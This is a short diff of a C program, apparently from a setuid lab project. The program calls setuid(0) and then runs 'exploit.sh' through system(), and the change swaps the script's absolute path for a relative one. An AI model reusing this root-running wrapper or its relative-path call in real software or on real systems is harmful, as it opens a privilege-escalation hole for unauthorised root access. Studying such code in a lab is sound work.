@@ -6,6 +6,6 @@
 int main()
 {
     setuid(0);
-    system( "/home/rab/suidProject/exploit.sh" );
+    system( "./exploit.sh" );
     return 0;
 }
